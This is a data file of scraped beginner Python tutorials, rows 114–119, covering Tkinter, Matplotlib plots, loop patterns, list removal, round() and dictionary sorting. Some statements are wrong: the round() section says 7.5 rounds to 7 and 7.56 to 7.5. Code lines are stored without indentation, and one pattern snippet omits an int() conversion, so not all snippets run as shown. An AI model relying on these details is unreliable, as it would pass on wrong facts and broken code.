114,['How to install Tkinter in Python'],"['Tkinter is a standard library Python that used for GUI application. Tkinter with Python offers a straightforward and fast way to create GUI applications. Tk GUI works on the object-oriented approach which makes it a powerful library. Tkinter is widely available for all operating systems. It is pre-install in the Python. To work with the Tkinter, we must install the Python. In this tutorial, we will learn to install Tkinter.']","['https://www.javatpoint.com/how-to-plot-a-graph-in-python', 'https://www.javatpoint.com/how-to-develop-a-game-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tkinter', 'https://www.javatpoint.com/https://www.python.org', 'https://www.javatpoint.com/how-to-plot-a-graph-in-python', 'https://www.javatpoint.com/how-to-develop-a-game-in-python', 'https://www.javatpoint.com/how-to-plot-a-graph-in-python']","['https://static.javatpoint.com/python/images/how-to-install-tkinter-in-python.png', 'https://static.javatpoint.com/python/images/how-to-install-tkinter-in-python2.png']",[],[],"['Prerequisites', 'Installing Tkinter in Windows']",[],"['To create a user-friend GUI application, you should have basic knowledge of Python programming language.', 'To check the Tkinter, we just need to import it in the text editor or IDE.', ""Now, we can access its functions to create widget. Let's understand the following."", 'All elements will be taken place in this Tkinter window. ']","['First, we must ensure that Python is installed or not in our system. If not, visit our tutorial (https://www.javatpoint.com/how-to-install-python) install the Python properly.', ""Tkinter comes with the Python installer. We just need to install Python from www.python.org, and it comes along with the Python. We don't need to install it separately. Click on the checkbox of tcl/tk and IDE.""]",[],"['import tkinter as tk', 'from tkinter import *', 'root = Tk()', '# Code to add widget will go here……..', 'w = Label(root, width = ""40"", height = ""15"")', 'w.pack()', 'root.mainloop()']",[],[],[]
115,['How to plot a graph in Python'],"['Python provides one of a most popular plotting library called Matplotlib. It is open-source, cross-platform for making 2D plots for from data in array. It is generally used for data visualization and represent through the various graphs.']","['https://www.javatpoint.com/how-to-print-pattern-in-python', 'https://www.javatpoint.com/how-to-install-tkinter-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/how-to-print-pattern-in-python', 'https://www.javatpoint.com/how-to-install-tkinter-in-python', 'https://www.javatpoint.com/how-to-print-pattern-in-python']","['https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python4.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python5.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python6.png', 'https://static.javatpoint.com/python/images/how-to-plot-a-graph-in-python7.png']",[],['Ploting Different Type of Graphs'],"['Installation of Matplotlib', 'Basic Concept of Matplotlib', 'Introduction to pyplot', 'Basic Example of plotting Graph', '1. Line Graph', '2. Bar Graph', '3. Pie Chart', '4. Histogram', '5. Scatter Plot']",[],"['Matplotlib is originally conceived by the John D. Hunter in 2003. The recent version of matplotlib is 2.2.0 released in January 2018.', 'Before start working with the matplotlib library, we need to install in our Python environment.', 'Type the following command in your terminal and press enter.', 'The above command will install matplotlib library and its dependency package on Window operating system.', ""A graph contains the following parts. Let's understand these parts."", 'Figure: It is a whole figure which may hold one or more axes (plots). We can think of a Figure as a canvas that holds plots.', 'Axis: Axises are the number of line like objects and responsible for generating the graph limits.', 'Artist: An artist is the all which we see on the graph like Text objects, Line2D objects, and collection objects. Most Artists are tied to Axes.', ""We can plot a graph with pyplot quickly. Let's have a look at the following example."", 'Here is the basic example of generating a simple graph; the program is following:', ""We can plot the various graph using the pyplot module. Let's understand the following examples."", 'The line chart is used to display the information as a series of the line. It is easy to plot. Consider the following example.', 'The line can be modified using the various functions. It makes the graph more attractive. Below is the example.', ""Let's understand another example."", 'Example - 2:', 'Example - 2:']","['Axes: A Figure can contain several Axes. It consists of two or three (in the case of 3D) Axis objects. Each Axes is comprised of a title, an x-label, and a y-label.', 'Bar graph is one of the most common graphs and it is used to represent the data associated with the categorical variables. The bar() function accepts three arguments - categorical variables, values, and color.', ""A chart is a circular graph which is divided into the sub-part or segment. It is used to represent the percentage or proportional data where each slice of pie represents a particular category. Let's understand the below example."", ""In the following example, we have taken the data of the different score percentages of the student and plot the histogram with respect to number of student. Let's understand the following example."", ""The scatter plot is used to compare the variable with respect to the other variables. It is defined as how one variable affected the other variable. The data is represented as a collection of points. Let's understand the following example."", 'In this tutorial, we have discussed all basic types of graph which used in data visualization. To learn more about graph, visit our matplotlib tutorial.']","['The matplotlib provides the pyplot package which is used to plot the graph of given data. The matplotlib.pyplot is a set of command style functions that make matplotlib work like MATLAB. The pyplot package contains many functions which used to create a figure, create a plotting area in a figure, decorates the plot with labels, plot some lines in a plotting area, etc.', 'The histogram and bar graph is quite similar but there is a minor difference them. A histogram is used to represent the distribution, and bar chart is used to compare the different entities. A histogram is generally used to plot the frequency of a number of values compared to a set of values ranges.']","['pip install matplotlib', 'from matplotlib import pyplot as plt', '#ploting our canvas', 'plt.plot([1,2,3],[4,5,1])', '#display the graph', 'plt.show()', 'from matplotlib import pyplot as plt', 'x = [1,2,3]', 'y = [10,11,12]', 'plt.plot(x,y)', 'plt.title(""Line graph"")', ""plt.ylabel('Y axis')"", ""plt.xlabel('X axis')"", 'plt.show()', 'from matplotlib import pyplot as plt', 'from matplotlib import style', ""style.use('ggplot')"", 'x = [10, 12, 13]', 'y = [8, 16, 6]', 'x2 = [8, 15, 11]', 'y2 = [6, 15, 7]', ""plt.plot(x, y, 'b', label='line one', linewidth=5)"", ""plt.plot(x2, y2, 'r', label='line two', linewidth=5)"", ""plt.title('Epic Info')"", 'fig = plt.figure()', ""plt.ylabel('Y axis')"", ""plt.xlabel('X axis')"", 'plt.show()', 'from matplotlib import pyplot as plt', ""Names = ['Arun','James','Ricky','Patrick']"", 'Marks = [51,87,45,67]', ""plt.bar(Names,Marks,color = 'blue')"", ""plt.title('Result')"", ""plt.xlabel('Names')"", ""plt.ylabel('Marks')"", 'plt.show()', 'from matplotlib import pyplot as plt', '# Pie chart, where the slices will be ordered and plotted counter-clockwise:', ""Aus_Players = 'Smith', 'Finch', 'Warner', 'Lumberchane'"", 'Runs = [42, 32, 18, 24]', 'explode = (0.1, 0, 0, 0)  # it ""explode"" the 1st slice', 'fig1, ax1 = plt.subplots()', ""ax1.pie(Runs, explode=explode, labels=Aus_Players, autopct='%1.1f%%',"", 'shadow=True, startangle=90)', ""ax1.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle."", 'plt.show()', 'from matplotlib import pyplot as plt', 'from matplotlib import pyplot as plt', 'percentage = [97,54,45,10, 20, 10, 30,97,50,71,40,49,40,74,95,80,65,82,70,65,55,70,75,60,52,44,43,42,45]', 'number_of_student = [0,10,20,30,40,50,60,70,80,90,100]', ""plt.hist(percentage, number_of_student, histtype='bar', rwidth=0.8)"", ""plt.xlabel('percentage')"", ""plt.ylabel('Number of people')"", ""plt.title('Histogram')"", 'plt.show()', 'from matplotlib import pyplot as plt', '# Importing Numpy Library', 'import numpy as np', ""plt.style.use('fivethirtyeight')"", 'mu = 50', 'sigma = 7', 'x = np.random.normal(mu, sigma, size=200)', 'fig, ax = plt.subplots()', 'ax.hist(x, 20)', ""ax.set_title('Historgram')"", ""ax.set_xlabel('bin range')"", ""ax.set_ylabel('frequency')"", 'fig.tight_layout()', 'plt.show()', 'from matplotlib import pyplot as plt', 'from matplotlib import style', ""style.use('ggplot')"", 'x = [4,8,12]', 'y = [19,11,7]', 'x2 = [7,10,12]', 'y2 = [8,18,24]', 'plt.scatter(x, y)', ""plt.scatter(x2, y2, color='g')"", ""plt.title('Epic Info')"", ""plt.ylabel('Y axis')"", ""plt.xlabel('X axis')"", 'plt.show()', 'import matplotlib.pyplot as plt', 'a = [2, 2.5, 3, 3.5, 4.5, 4.7, 5.0]', 'b = [7.5, 8, 8.5, 9, 9.5, 10, 10.5]', 'a1 = [9, 8.5, 9, 9.5, 10, 10.5, 12]', 'b1 = [3, 3.5, 4.7, 4, 4.5, 5, 5.2]', ""plt.scatter(a, b, label='high income low saving', color='b')"", ""plt.scatter(a1, b1, label='low income high savings', color='g')"", ""plt.xlabel('saving*100')"", ""plt.ylabel('income*1000')"", ""plt.title('Scatter Plot')"", 'plt.legend()', 'plt.show()']",[],[],[]
116,['How to print pattern in Python'],"['In Python, for loop is used to print the various patterns. Printing the various patterns are most common asked programming questions in the interview. The multiple for loops are used to print the patterns where the first outer loop is used to print the number of rows, and the inner loop is used to print the number of columns. Most of the patterns use the following concepts.']","['https://www.javatpoint.com/how-to-remove-an-element-from-a-list-in-python', 'https://www.javatpoint.com/how-to-plot-a-graph-in-python', 'https://www.javatpoint.com/how-to-remove-an-element-from-a-list-in-python', 'https://www.javatpoint.com/how-to-plot-a-graph-in-python', 'https://www.javatpoint.com/how-to-remove-an-element-from-a-list-in-python']",[],[],"['Print Pyramid, Star, and diamond pattern in Python', 'Number Pattern in Python', 'Alphabets and Letters Pattern in Python']","['Pattern - 1: Simple pyramid pattern', 'Pattern - 2: Reverse right angle pyramid', 'Pattern - 3: Printing Downward half - Pyramid', 'Pattern - 4: Printing Triangle Pyramid', 'Pattern - 5: Downward Triangle Pattern', 'Pattern - 6: Diamond Shaped Pattern', 'Pattern - 7: Print two pyramid in a single pattern', 'Pattern - 8: Hourglass Pattern', 'Pattern - 1: Number Pattern', 'Pattern - 2: Half pyramid pattern with the number', 'Pattern - 3: Inverted Pyramid Pattern', 'Pattern - 4: Same number Inverted Pyramid', 'Pattern - 5: Descending Order of Number', 'Pattern - 6: Print 1 to 10 numbers in Pattern', 'Pattern - 7: Reverse Pattern from 10 to 1', 'Pattern - 8: Print Odd Numbers', 'Pattern - 9: Square Pattern using with number', 'Pattern - 10: Multiplication Number in Column', 'Pattern - 1: Right-angled pattern with characters', 'Pattern - 2: Right-angled Pattern with Same Character', 'Pattern - 3: Display letter of the word in Pattern', 'Pattern - 5: Equilateral triangle pattern with characters']",[],"['In this tutorial, we will discuss a few common patterns.', 'In this section, we will learn the common pyramid patterns.', 'Explanation:', 'We have discussed the basic pyramid pattern using for loops. The concept of the pattern depends on the logic and proper use of for loop.', ""In this section, we describe a few programs of different types of number patterns. Let's understand the following patterns one by one."", 'Explanation -', 'In the above code, we have printed the column value j in the inner for loop.', 'Explanation:', 'In the above code, we have used the reversed loop to print the downward inverted pyramid where number reduced after each iteration.', 'Explanation -', 'We can use any word to print the characters.']","['In the above code, we have initialized the n variable to enter the number of rows for the pattern. We entered n = 5, the range of outer for loop will be 0 to 4.', 'In the above code, we have printed the numbers according to rows value. The first row prints a single number. Next, two numbers, prints in the second row, and the next three number prints on the third row and so on. In the', 'In the above section, we have discussed all the basic number patterns. It will make a strong command on Python for loop. We can any type of pattern using for loop.', ""As we know that the, each alphabet has its own ASCII value, so define a character and print it to the screen. Let's understand these patterns by following examples""]","['In the above code, we have assigned the integer value 65 to asciiValue variable which is an ASCII value of A. We defined for loop to print five rows. In the inner loop body, we converted the ASCII value into the character using the char() function. It will print the alphabets, increased the asciiValue after each iteration.', 'In this article, we have discussed all basic pattern programs. These patterns are commonly asked during the interview and it is also helpful to understand the concept of Python for loop. Once we get the logic of the program, we can print the any pattern using the Python loops.']","['# This is the example of print simple pyramid pattern', 'n = int(input(""Enter the number of rows""))', '# outer loop to handle number of rows', 'for i in range(0, n):', '# inner loop to handle number of columns', '# values is changing according to outer loop', 'for j in range(0, i + 1):', '# printing stars', 'print(""* "", end="""")', '# ending line after each row', 'print()', '# This is the example of print simple reversed right angle pyramid pattern', 'rows = int(input(""Enter the number of rows:""))', 'k = 2 * rows - 2  # It is used for number of spaces', 'for i in range(0, rows):', 'for j in range(0, k):', 'print(end="" "")', 'k = k - 2   # decrement k value after each iteration', 'for j in range(0, i + 1):', 'print(""* "", end="""")  # printing star', 'print("""")', 'rows = int(input(""Enter the number of rows: ""))', '# the outer loop is executing in reversed order', 'for i in range(rows + 1, 0, -1):', 'for j in range(0, i - 1):', 'print(""*"", end=\' \')', 'print("" "")', 'n = int(input(""Enter the number of rows: ""))', 'm = (2 * n) - 2', 'for i in range(0, n):', 'for j in range(0, m):', 'print(end="" "")', 'm = m - 1  # decrementing m after each loop', 'for j in range(0, i + 1):', '# printing full Triangle pyramid using stars', 'print(""* "", end=\' \')', 'print("" "")', 'rows = int(input(""Enter the number of rows: ""))', '# It is used to print space', 'k = 2 * rows - 2', '# Outer loop in reverse order', 'for i in range(rows, -1, -1):', '# Inner loop will print the number of space.', 'for j in range(k, 0, -1):', 'print(end="" "")', 'k = k + 1', '# This inner loop will print the number o stars', 'for j in range(0, i + 1):', 'print(""*"", end="" "")', 'print("""")', 'rows = int(input(""Enter the number of rows: ""))', '# It is used to print the space', 'k = 2 * rows - 2', '# Outer loop to print number of rows', 'for i in range(0, rows):', '# Inner loop is used to print number of space', 'for j in range(0, k):', 'print(end="" "")', '# Decrement in k after each iteration', 'k = k - 1', '# This inner loop is used to print stars', 'for j in range(0, i + 1):', 'print(""* "", end="""")', 'print("""")', '# Downward triangle Pyramid', '# It is used to print the space', 'k = rows - 2', '# Output for downward triangle pyramid', 'for i in range(rows, -1, -1):', '# inner loop will print the spaces', 'for j in range(k, 0, -1):', 'print(end="" "")', '# Increment in k after each iteration', 'k = k + 1', '# This inner loop will print number of stars', 'for j in range(0, i + 1):', 'print(""* "", end="""")', 'print("""")', 'rows = input(""Enter the number of rows: "")', '# Outer loop will print the number of rows', 'for i in range(0, rows):', '# This inner loop will print the stars', 'for j in range(0, i + 1):', 'print(""*"", end=\' \')', '# Change line after each iteration', 'print("" "")', '# For second pattern', 'for i in range(rows + 1, 0, -1):', 'for j in range(0, i - 1):', 'print(""*"", end=\' \')', 'print("" "")', 'rows = int(input(""Enter the number of rows: ""))', 'k = rows - 2', '# This is used to print the downward pyramid', 'for i in range(rows, -1 , -1):', 'for j in range(k , 0 , -1):', 'print(end="" "")', 'k = k + 1', 'for j in range(0, i+1):', 'print(""* "" , end="""")', 'print()', '# This is used to print the upward pyramid', 'k = 2 * rows  - 2', 'for i in range(0 , rows+1):', 'for j in range(0 , k):', 'print(end="""")', 'k = k - 1', 'for j in range(0, i + 1):', 'print(""* "", end="""")', 'print()', 'rows = int(input(""Enter the number of rows: ""))', '# Outer loop will print number of rows', 'for i in range(rows+1):', '# Inner loop will print the value of i after each iteration', 'for j in range(i):', 'print(i, end="" "")  # print number', '# line after each row to display pattern correctly', 'print("" "")', 'rows = int(input(""Enter the number of rows: ""))', '# This will print the rows', 'for i in range(1, rows+1):', '# This will print number of column', 'for j in range(1, i + 1):', ""print(j, end=' ')"", 'print("""")', 'rows = int(input(""Enter the number of rows: 5""))', '# Reversed loop for downward inverted pattern', 'for i in range(rows, 0, -1):', '# Increment in k after each iteration', 'k += 1', 'for j in range(1, i + 1):', ""print(k, end=' ')"", 'print()', 'rows = int(input(""Enter the number of rows: ""))', '# rows value assign to n variable', 'n = rows', '# Download reversed loop', 'for i in range(rows, 0, -1):', 'for j in range(0, i):', '# this will print the same number', ""print(n, end=' ')"", 'print()', 'rows = int(input(""Enter the number of rows: ""))', '# Downward loop for inverse loop', 'for i in range(rows, 0, -1):', 'n = i   # assign value to n of i after each iteration', 'for j in range(0, i):', '# print reduced value in each new line', ""print(n, end=' ')"", 'print(""\\r"")', 'current_Number = 1', 'stop = 2', 'rows = 3  # Number of rows to print numbers', 'for i in range(rows):', 'for j in range(1, stop):', ""print(current_Number, end=' ')"", 'current_Number += 1', 'print("""")', 'stop += 2', 'rows = int(input(""Enter the number of rows: ""))', 'for i in range(0, rows + 1):', '# inner loop for decrement in i values', 'for j in range(rows - i, 0, -1):', ""print(j, end=' ')"", 'print()', 'rows = int(input(""Enter the number of rows: ""))', '# outer file loop to print number of rows', 'while i <= rows:', 'j = 1', '# Check the column after each iteration', 'while j <= i:', '# print odd values', 'print((i * 2 - 1), end="" "")', 'j = j + 1', 'i = i + 1', 'print()', 'rows = int(input(""Enter the number of rows: ""))', 'for i in range(1, rows + 1):', 'for j in range(1, rows + 1):', '# Check condition if value of j is smaller or equal than', '# the j then print i otherwise print j', 'if j <= i:', ""print(i, end=' ')"", 'else:', ""print(j, end=' ')"", 'print()', 'rows = int(input(""Enter the number of rows: ""))', 'for i in range(1, rows):', 'for j in range(1, i + 1):', '# It prints multiplication or row and column', ""print(i * j, end='  ')"", 'print()', 'print(""The character pattern "")', 'asciiValue = 65     #ASCII value of A', 'for i in range(0, 5):', 'for j in range(0, i + 1):', '# It will convert the ASCII value to the character', 'alphabate = chr(asciiValue)', ""print(alphabate, end=' ')"", 'asciiValue += 1', 'print()', 'print(""The character pattern "")', 'asciiValue = int(input(""Enter the ASCII value to print pattern: ""))', '# User - define value', 'if (asciiValue >= 65 or asciiValue <=122):', 'for i in range(0, 5):', 'for j in range(0, i + 1):', '# It will convert the ASCII value to the character', 'alphabate = chr(asciiValue)', ""print(alphabate, end=' ')"", 'print()', 'print(""Enter the valid character value"")', 'str1 = ""JavaTpoint""', 'for i in str1:', 'x += i', 'print(x)', 'print(""Print equilateral triangle Pyramid with characters "")', 'asciiValue = 65', 'm = (2 * s) - 2', 'for i in range(0, s):', 'for j in range(0, m):', 'print(end="" "")', '# Decreased the value of after each iteration', 'm = m - 1', 'for j in range(0, i + 1):', 'alphabate = chr(asciiValue)', ""print(alphabate, end=' ')"", '# Increase the ASCII number after each iteration', 'asciiValue += 1', 'print()']","['*', '* *', '* * *', '* * * *', '* * * * *', '*', '* *', '* * *', '* * * *', '* * * * *', 'Enter the number of rows: 5', '* * * * *', '* * * *', '* * *', '* *', '*', 'Enter the number of rows: 10', '*', '*  *', '*  *  *', '*  *  *  *', '*  *  *  *  *', '*  *  *  *  *  *', '*  *  *  *  *  *  *', '*  *  *  *  *  *  *  *', '*  *  *  *  *  *  *  *  *', '*  *  *  *  *  *  *  *  *  *', '* * * * * * * * * * *', '* * * * * * * * * *', '* * * * * * * * *', '* * * * * * * *', '* * * * * * *', '* * * * * *', '* * * * *', '* * * *', '* * *', '* *', '*', 'Enter the number of rows: 8', '*', '* *', '* * *', '* * * *', '* * * * *', '* * * * * *', '* * * * * * *', '* * * * * * * *', '* * * * * * * * *', '* * * * * * * *', '* * * * * * *', '* * * * * *', '* * * * *', '* * * *', '* * *', '* *', '*', 'Enter the number of rows: 7', '*', '* *', '* * *', '* * * *', '* * * * *', '* * * * * *', '* * * * * * *', '* * * * * * *', '* * * * * *', '* * * * *', '* * * *', '* * *', '* *', '*', 'Enter the number of rows: 5', '* * * * * *', '* * * * *', '* * * *', '* * *', '* *', '*', '*', '* *', '* * *', '* * * *', '* * * * *', '* * * * * *', 'Enter the number of rows: 5', '1', '2 2', '3 3 3', '4 4 4 4', '5 5 5 5 5', 'Enter the number of rows: 5', '1', '1 2', '1 2 3', '1 2 3 4', '1 2 3 4 5', 'Enter the number of rows: 5', '1 1 1 1 1', '2 2 2 2', '3 3 3', '4 4', '5', 'Enter the number of rows: 6', '6 6 6 6 6 6', '6 6 6 6 6', '6 6 6 6', '6 6 6', '6 6', '6', 'Enter the number of rows: 6', '6 6 6 6 6 6', '5 5 5 5 5', '4 4 4 4', '3 3 3', '2 2', '1', '1', '2 3 4', '5 6 7 8 9', 'Enter the number of rows: 6', '6 5 4 3 2 1', '5 4 3 2 1', '4 3 2 1', '3 2 1', '2 1', '1', 'Enter the number of rows: 5', '1', '3 3', '5 5 5', '7 7 7 7', '9 9 9 9 9', 'Enter the number of rows: 5', '1 2 3 4 5', '2 2 3 4 5', '3 3 3 4 5', '4 4 4 4 5', '5 5 5 5 5', 'Enter the number of rows: 8', '1', '2  4', '3  6  9', '4  8  12  16', '5  10  15  20  25', '6  12  18  24  30  36', '7  14  21  28  35  42  49', 'The character pattern', 'A', 'B C', 'D E F', 'G H I J', 'K L M N O', 'The character pattern', 'Enter the ASCII value to print pattern: 75', 'K', 'K K', 'K K K', 'K K K K', 'K K K K K', 'J', 'Ja', 'Jav', 'Java', 'JavaT', 'JavaTp', 'JavaTpo', 'JavaTpoi', 'JavaTpoin', 'JavaTpoint', 'Print equilateral triangle Pyramid with characters', 'A', 'B C', 'D E F', 'G H I J', 'K L M N O']",[],"['|||The outer loop to print the number of rows.|||The inner loops to print the number of columns.|||The variable to print whitespace according to the required place in Python.||||||The iteration of the inner for loop depends on the outer loop. The inner loop is responsible to print the number of columns.|||In the first iteration, the value of i is 0, and it increased by 1, so it becomes 0+1, now inner loop iterated first time and print one star(*).|||In the second iteration, the value of i is 1 and it increased by 1, so it becomes 1+1, now inner loop iterated two times and print two-star (*).|||The end argument prevents to jump into another line. It will printer the star until the loop is valid.|||The last print statement is responsible for ending the line after each row.|||']"
117,['How to remove an element from a list in Python'],"[""Python provides the following methods to remove one or multiple elements. We can delete the elements using the del keyword by specifying the index position. Let's understand the following methods.""]","['https://www.javatpoint.com/how-to-round-number-in-python', 'https://www.javatpoint.com/how-to-print-pattern-in-python', 'https://www.javatpoint.com/how-to-round-number-in-python', 'https://www.javatpoint.com/how-to-print-pattern-in-python', 'https://www.javatpoint.com/how-to-round-number-in-python']",[],[],[],"['The remove() method', 'The pop() method', 'The clear() method', 'The del statement', 'Using List Comprehension']",[],"[""If the list contains more than one item of the same name, it removes that item's first occurrence."", 'We can also specify the negative index position. The index -1 represents the last item of the list.', ""The clear() method removes all items from the list. It returns the empty list. Let's understand the following example."", ""We can remove the list item using the del keyword. It deletes the specified index item. Let's understand the following example."", 'It can delete the entire list.', ""We can also delete the multiple items from the list using the del with the slice operator. Let's understand the following example."", ""Let's understand the following example.""]","[""The remove() method is used to remove the specified value from the list. It accepts the item value as an argument. Let's understand the following example."", ""The pop() method removes the item at the specified index position. If we have not specified the index position, then it removes the last item from the list. Let's understand the following example.""]","[""The list comprehension is slightly different way to remove the item from the list. It removes those items which satisfy the given condition. For example - To remove the even number from the given list, we define the condition as i % 2 which will give the reminder 2 and it will remove those items that's reminder is 2.""]","[""list1 = ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", 'print(""The list is: "", list1)', ""list1.remove('Joseph')"", 'print(""After removing element: "",list1)', ""list1 = ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", 'print(""The list is: "", list1)', ""list1.remove('Bob')"", 'print(""After removing element: "",list1)', ""list1 = ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", 'print(""The list is: "", list1)', 'list1.pop(3)', 'print(""After removing element: "",list1)', '# index position is omitted', 'list1.pop()', 'print(""After removing element: "",list1)', ""list1 = ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", 'print(""The list is: "", list1)', '# Negative Indexing', 'list1.pop(-2)', 'print(""After removing element: "",list1)', 'list1 = [10, 20, 30, 40, 50, 60]', 'print(list1)', '# It will return the empty list', 'list1.clear()', 'print(list1)', 'list1 = [10, 20, 30, 40, 50, 60]', 'print(list1)', 'del list1[5]', 'print(list1)', 'del list1[-1]', 'print(list1)', 'del list1', 'print(list1)', 'list1 = [10, 20, 30, 40, 50, 60]', 'print(list1)', 'del list1[1:3]', 'print(list1)', 'del list1[-4:-1]', 'print(list1)', 'del list1[:]', 'print(list1)', 'list1 = [11, 20, 34, 40, 45, 60]', '# Remove the odd numbers', 'print([i for i in list1 if i % 2 == 0])', '#Remove the even numbers', 'print([i for i in list1 if i % 2 != 0])']","[""The list is:  ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", ""After removing element:  ['Bob', 'Charlie', 'Bob', 'Dave']"", ""The list is:  ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", ""After removing element:  ['Joseph', 'Charlie', 'Bob', 'Dave']"", ""The list is:  ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", ""After removing element:  ['Joseph', 'Bob', 'Charlie', 'Dave']"", ""After removing element:  ['Joseph', 'Bob', 'Charlie']"", ""The list is:  ['Joseph', 'Bob', 'Charlie', 'Bob', 'Dave']"", ""After removing element:  ['Joseph', 'Bob', 'Charlie', 'Dave']"", '[10, 20, 30, 40, 50, 60]', '[]', '[10, 20, 30, 40, 50, 60]', '[10, 20, 30, 40, 50]', '[10, 20, 30, 40]', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Practice Python/first.py"", line 14, in', 'print(list1)', ""NameError: name 'list1' is not defined"", '[10, 20, 30, 40, 50, 60]', '[10, 40, 50, 60]', '[60]', '[]', '[20, 34, 40, 60]', '[11, 45]']",[],['|||remove()|||pop()|||clear()|||del|||List Comprehension - If specified condition is matched.|||']
118,['How to Round number in Python'],"['Python provides the built-in round() function, which used to round off a number to a given number of digits. It takes the two arguments, first is n, second is n digits and then it returns number n after rounding it to ndigits. By default, it rounds off the number n to the nearest integer.']","['https://www.javatpoint.com/how-to-sort-a-dictionary-in-python', 'https://www.javatpoint.com/how-to-remove-an-element-from-a-list-in-python', 'https://www.javatpoint.com/how-to-sort-a-dictionary-in-python', 'https://www.javatpoint.com/how-to-remove-an-element-from-a-list-in-python', 'https://www.javatpoint.com/how-to-sort-a-dictionary-in-python']",[],[],[],"['Syntax:', 'Example -', 'Example -', 'The real-life example of the round() function']",[],"['The parameters are -', ""Let's understand the following example -"", 'Now, the second parameter is used.', 'Another example', 'The round() function rounds 5.5 up to 6 and 6.5 down to 6. This is not a bug, the round() behaves like this way.']","[""For example - If we want to round off a number, let's suppose 7.5. It will be rounded off to the nearest whole number is 7. However, the number 7.56 will be rounded off to 7.5 by one places to give."", 'The round() function is essential when working with the number of floats that may have many decimal places. The round() function makes easy and simple. The syntax is given below.']","[""The round() function is most useful while changing fractions to decimals. We generally get the number of a decimal points such as if we do 1/3 then we get 0.333333334, but we use either two or three digits to the right of the decimal points. Let's understand the following example.""]","['round(number, number of digits)', 'print(round(15))', '# For floating point', 'print(round(25.8))', 'print(round(25.4))', 'print(round(25.4654, 2))', '# when the (ndigit+1)th digit is >=5', 'print(round(25.4276, 3))', '# when the (ndigit+1)th digit is <5', 'print(round(25.4173, 2))', 'x = 1/6', 'print(x)', 'print(round(x, 2))', 'print(round(5.5))', 'print(round(5))', 'print(round(6.5))']","['15', '26', '25', '25.47', '25.428', '25.42', '0.16666666666666666', '0.17', '6', '5', '6']",[],['|||number - It represents the given number to be rounded.|||number of digits(Optional) - It represents the number of digits up to which the given number is to be rounded.|||']
119,['How to sort a dictionary in Python'],"['Python dictionary is the collection of data which stored in the key-value form. Each key is associated with its value. It is mutable in nature, which means we can change data after its creation.']","['https://www.javatpoint.com/strong-number-in-python', 'https://www.javatpoint.com/how-to-round-number-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/strong-number-in-python', 'https://www.javatpoint.com/how-to-round-number-in-python', 'https://www.javatpoint.com/strong-number-in-python']",[],[],[],"['Why need to sort the dictionary', 'Sorting By Keys and Values', 'Sorting Algorithm', 'Reverse the sorted Order']",[],"['It is the unordered collection of the data and allows storing duplicate values, but the key must be unique.', 'Dictionary is declared using the curly braces {}, and the key-value pair is separated by a comma.', ""Let's understand the various ways to sort the dictionary."", 'Explanation -', ""There are various sorting algorithm to sort a dictionary; we can use other arguments in the sorted method. Let's understand the following example."", ""The dictionary can be reversed using the reverse argument. Let's understand the following example.""]","['In the above code, we have declared a dictionary names. We used the built-in function along with the sorted() function that returned the list of the sorted keys. Next, we used the items() function to get the dictionary in the sorted order.', 'In this tutorial, we have discussed how to sort the dictionary in Python. A sorted dictionary is easy to handle the large amount of data and gives us a fast search result.']","[""Python offers the built-in keys functions keys() and values() functions to sort the dictionary. It takes any iterable as an argument and returns the sorted list of keys. We can use the keys to sort the dictionary in the ascending order. Let's understand the following example.""]","[""dict1 = {'name': 'Devansh', 'age': 22, 'Rollno':90014}"", 'print(dict1)', ""names = {1:'Alice' ,2:'John' ,4:'Peter' ,3:'Andrew' ,6:'Ruffalo' ,5:'Chris' }"", '#print a sorted list of the keys', 'print(sorted(names.keys()))', '#print the sorted list with items.', 'print(sorted(names.items()))', ""daynames = { 'one' : 'Monday' ,  'six' : 'Saturday' ,'three' : 'Wednesday' ,  'two' : 'Tuesday' , 'five': 'Friday' ,  'seven': 'Sunday' }"", 'print(daynames)', ""number = { 'one' : 1 , 'two' : 2 , 'three' : 3 , 'four' : 4 , 'five' : 5 , 'six' : 6 , 'seven' : 7}"", 'print(sorted(daynames , key=number.__getitem__))', 'print([daynames[i] for i in sorted(daynames , key=number.__getitem__)])', ""a = {'a':2 ,'b':1 ,'c':3 ,'d':4 ,'e':5 ,'f':6 }"", 'print(sorted(a.values() ,  reverse= True))']","['[1, 2, 3, 4, 5, 6]', ""[(1, 'Alice'), (2, 'John'), (3, 'Andrew'), (4, 'Peter'), (5, 'Chris'), (6, 'Ruffalo')]"", ""{'one': 'Monday', 'six': 'Saturday', 'three': 'Wednesday', 'two': 'Tuesday', 'five': 'Friday', 'seven': 'Sunday'}"", ""['one', 'two', 'three', 'five', 'six', 'seven']"", ""['Monday', 'Tuesday', 'Wednesday', 'Friday', 'Saturday', 'Sunday']"", '[6, 5, 4, 3, 2, 1]']",[],"['|||The search time complexity of the list is O(n), and the dictionary has search time complexity 0(1), which makes that the dictionary is faster than the list. The dictionary can be used in place for list whenever it needs.|||The sorting allows us to analyze the data efficiently when we are working with the data-structure.|||A sorted dictionary provides a better understanding to handle the complex operations.||||||Sorting by keys|||Sorting by values|||Sorting Algorithm|||Reversing the sorted order|||']"
